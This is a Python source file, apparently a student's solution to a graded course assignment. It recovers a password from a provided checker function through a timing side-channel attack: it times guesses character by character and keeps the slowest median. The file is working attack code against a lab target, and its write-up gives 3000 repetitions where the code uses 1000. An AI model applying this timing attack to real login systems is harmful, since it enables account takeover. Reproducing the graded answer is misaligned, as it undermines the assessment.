# -*- coding: utf-8 -*-
import time
import numpy as np
import statistics
from time_password_checker import check_password

class solution():
    def __init__(self) -> None:
        # DO NOT MODIFY THE EXISTED PROPERTY
        # You can add as many properties as you need
        self.password = ""                                              # This is where your guessed password is store
    
    def example(self):
        # The following shows how to get the time spent
        # You can modify it to test your ideas
        
        # If password is correct, check_password will return Correct
        # If password is wrong, check_password will return Wrong
        
        T1 = time.perf_counter()
        result = check_password(self.password)
        T2 = time.perf_counter()
        
        # You can print the output for debug or test.
        print(result)
        print("time spend: ", T2-T1)
    
    def get_median(self, arr):
        # sort in ascending order
        arr.sort()
        # calculate interquartile range
        q1, q3 = np.percentile(arr, [25, 75])
        iqr = q3 - q1
        # compute lower and upper bound - anything lower than lower_bound and higher than upper_bound is a noisy point
        lower_bound = q1 - (1.5 * iqr)
        upper_bound = q3 + (1.5 * iqr)
        # return median between the two bounds
        return np.median([x for x in arr if lower_bound < x < upper_bound])
    
    def getPassword(self):
        # Please complete this method 
        # It should be the return the correct password in a string
        # GradeScope will import your class, and call this method to get the password you calculated.

        # all possible chars in password
        chars = ''.join(chr(i) for i in range(33, 127))
        password = ""
        # max length described in scope
        max_len = 11

        # iterate until max_len is found to prevent infinite loop
        while len(password) < max_len:
            times = []
            # iterate through all characters
            for char in chars:
                # create a guess
                guess = password + char
                # array of all delays as exemplified in the example function
                pass_delays = []
                # range 3000 worked best
                for _ in range(1000):
                    t1 = time.perf_counter()
                    res = check_password(guess)
                    t2 = time.perf_counter()
                    pass_delays.append(t2-t1)
                # add the median of all times in pass_delays with its associated char
                times.append((char, self.get_median(pass_delays)))

            # sort each char with the longest delays
            times.sort(key=lambda x: x[1], reverse=True)

            # try all possible next characters
            for char, _ in times:
                guess = password + char
                if check_password(guess) == 'Correct':
                    password += char
                    break
            else:
                # if none work, add the character with the highest day time
                password += times[0][0]

            print(password)
            # return if password is found
            if check_password(password) == 'Correct':
                return password

        return 'None'

# Write Up
# The solution finds the correct password using a time delay. Using a loop that continues until the length of the guessed password is less than the given max length
# we iterate and compute the computation delay in running the check_password funciton on guess. It is repeated 3000 times to get an accurate estimate.
# We add those to a pass_delay array of which the median is found and added to the times array. For all characters in the time array the code checks each guess
# and if the guess is correct it'll be added to the password string. If not, then the character with the highest median time is added to the password. This
# is repeated until a correct password is found. 

if __name__ == '__main__':
    sol = solution()
    password = sol.getPassword()
    print('Password found:', password)